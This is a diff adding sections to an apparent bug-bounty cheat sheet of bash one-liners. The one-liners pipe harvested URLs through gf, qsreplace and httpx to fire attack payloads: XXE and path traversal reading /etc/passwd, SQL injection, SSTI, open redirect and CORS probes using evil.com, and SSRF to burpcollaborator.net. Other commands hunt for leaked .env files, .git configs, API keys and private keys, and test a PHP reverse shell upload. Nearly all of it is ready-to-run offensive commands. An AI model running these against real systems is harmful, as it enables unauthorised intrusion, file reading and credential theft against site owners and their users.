@@ -1113,3 +1113,130 @@ cat subdomains.txt | jwt_tool -I -bruteforce wordlist.txt -o weak_jwt_keys.txt
 ```bash
 cat all_urls.txt | httpx -silent -fr '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' -o leaked_emails.txt
 ```
+
+### IDOR (Insecure Direct Object Reference)
+   - **Command:**
+     ```bash
+     cat all_urls.txt | gf idor | qsreplace 'id=123' | httpx -silent -fr 'id=123' -o idor_candidates.txt
+     ```
+
+### XML External Entity Injection (XXE)
+   - **Command:**
+     ```bash
+     cat all_urls.txt | gf xxe | qsreplace '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>' | httpx -silent -fr 'root:x' -o xxe_poc.txt
+     ```
+
+### Exposed Directory Listings (Misconfig)
+   - **Command:**
+     ```bash
+     cat subdomains.txt | httpx -silent -path '/' -fr 'Index of' -o open_dirs.txt
+     ```
+
+### Kubernetes Dashboard Exposure
+   - **Command:**
+     ```bash
+     cat subdomains.txt | httpx -silent -path '/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/' -mc 200 -o exposed_k8s_dashboard.txt
+     ```
+
+### Exposed Swagger API (Public API Docs)
+   - **Command:**
+     ```bash
+     cat subdomains.txt | httpx -silent -path '/swagger-ui.html' -mc 200 -o exposed_swagger.txt
+     ```
+
+### Open Redirect Detection
+   - **Command:**
+     ```bash
+     cat all_urls.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'evil.com' -o open_redirects.txt
+     ```
+
+### Directory Traversal (../ Exploit)
+   - **Command:**
+     ```bash
+     cat all_urls.txt | gf lfi | qsreplace '../etc/passwd' | httpx -silent -fr 'root:x' -o directory_traversal.txt
+     ```
+
+### Server-Side Template Injection (SSTI)
+   - **Command:**
+     ```bash
+     cat all_urls.txt | gf ssti | qsreplace '{{7*7}}' | httpx -silent -fr '49' -o ssti_found.txt
+     ```
+
+### Insecure Cross-Origin Resource Sharing (CORS)
+   - **Command:**
+     ```bash
+     cat subdomains.txt | httpx -silent -H "Origin: https://evil.com" -fr 'https://evil.com' -o weak_cors.txt
+     ```
+
+### SQL Injection - Quick Payload Fire
+   - **Command:**
+     ```bash
+     cat all_urls.txt | gf sqli | qsreplace "' OR '1'='1" | httpx -silent -fr 'error' -o sqli_poc.txt
+     ```
+
+### Backup Config Files (env/config.php)
+   - **Command:**
+     ```bash
+     cat subdomains.txt | httpx -silent -path-list <(echo -e '/.env\n/config.php\n/settings.py\n/config.json') -mc 200 -o leaked_configs.txt
+     ```
+
+### SSRF (Server-Side Request Forgery)
+   - **Command:**
+     ```bash
+     cat all_urls.txt | gf ssrf | qsreplace 'http://burpcollaborator.net' | httpx -silent -o ssrf_candidates.txt
+     ```
+
+### File Upload (Potential Upload Endpoints)
+   - **Command:**
+     ```bash
+     cat all_urls.txt | gf upload | httpx -silent -mc 200 -o upload_endpoints.txt
+     ```
+
+### Sensitive Data Exposure (Credit Card, API Keys)
+   - **Command:**
+     ```bash
+     cat all_urls.txt | httpx -silent -fr 'sk_live|pk_live|eyJhbGci|-----BEGIN PRIVATE KEY-----|4[0-9]{12}(?:[0-9]{3})?' -o sensitive_data.txt
+     ```
+
+### JWT Token Leak (in URL or Response)
+   - **Command:**
+     ```bash
+     cat all_urls.txt | httpx -silent -fr 'eyJ' -o jwt_leaks.txt
+     ```
+
+### Exposed Database Panels (phpMyAdmin, Mongo, etc)
+   - **Command:**
+     ```bash
+     cat subdomains.txt | httpx -silent -path-list <(echo -e '/phpmyadmin/\n/admin/\n/mongo-express/') -mc 200 -o exposed_db_panels.txt
+     ```
+
+### GIT Repo Exposure
+   - **Command:**
+     ```bash
+     cat subdomains.txt | httpx -silent -path '/.git/config' -mc 200 -o exposed_git.txt
+     ```
+
+### Debug Pages (dev.php/test.php)
+   - **Command:**
+     ```bash
+     cat subdomains.txt | httpx -silent -path-list <(echo -e '/test.php\n/dev.php\n/debug.php') -mc 200 -o debug_pages.txt
+     ```
+
+### Exposed API Keys in JavaScript Files
+   - **Command:**
+     ```bash
+     cat subdomains.txt | gau | grep '\.js$' | httpx -silent -fr 'AIza|sk_live|ghp_' -o api_key_leaks.txt
+     ```
+
+### Unsafe File Upload (PHP Reverse Shell Upload)
+   - **Command:**
+     ```bash
+     cat upload_endpoints.txt | qsreplace 'file=shell.php' | httpx -silent -mc 200 -o shell_upload.txt
+     ```
+
+### Clickjacking (Missing X-Frame-Options)
+   - **Command:**
+     ```bash
+     cat subdomains.txt | httpx -silent -header 'X-Frame-Options' -o missing_xfo.txt
+     ```
+
